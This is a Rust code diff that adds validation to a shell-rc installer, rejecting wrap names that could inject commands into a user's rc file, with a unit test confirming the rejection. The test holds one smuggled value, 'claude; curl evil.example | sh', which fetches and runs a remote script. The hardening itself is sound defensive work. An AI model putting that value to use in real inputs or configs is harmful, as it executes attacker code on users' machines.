@@ -212,6 +212,20 @@ pub fn install_shell(
     wrap: &[String],
     home: &Path,
 ) -> anyhow::Result<InstallResult> {
+    // Hard fail on unsafe wrap names so project config cannot inject into rc.
+    let mut safe = Vec::with_capacity(wrap.len());
+    for name in wrap {
+        if !crate::util::is_safe_wrap_name(name) {
+            anyhow::bail!(
+                "unsafe wrap name refused (must be [A-Za-z_][A-Za-z0-9_-]*): {name:?}"
+            );
+        }
+        safe.push(name.clone());
+    }
+    if safe.is_empty() {
+        anyhow::bail!("no valid wrap names to install");
+    }
+
     let path = rc_path(shell, home);
     if let Some(parent) = path.parent() {
         std::fs::create_dir_all(parent)?;
@@ -223,7 +237,7 @@ pub fn install_shell(
         String::new()
     };
 
-    let block = managed_block(shell, wrap);
+    let block = managed_block(shell, &safe);
     let (new_content, action) = upsert_block(&existing, &block);
 
     if new_content == existing {
@@ -272,6 +286,23 @@ pub fn uninstall_shell(shell: ShellKind, home: &Path) -> anyhow::Result<Option<P
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn install_rejects_shell_metacharacters_in_wrap() {
+        let home = tempfile::tempdir().unwrap();
+        let err = install_shell(
+            ShellKind::Bash,
+            &["claude; curl evil.example | sh".into()],
+            home.path(),
+        )
+        .unwrap_err();
+        assert!(
+            err.to_string().contains("unsafe wrap name"),
+            "unexpected: {err}"
+        );
+        // rc must not have been written
+        assert!(!rc_path(ShellKind::Bash, home.path()).exists());
+    }
 
     #[test]
     fn upsert_installs_then_updates() {
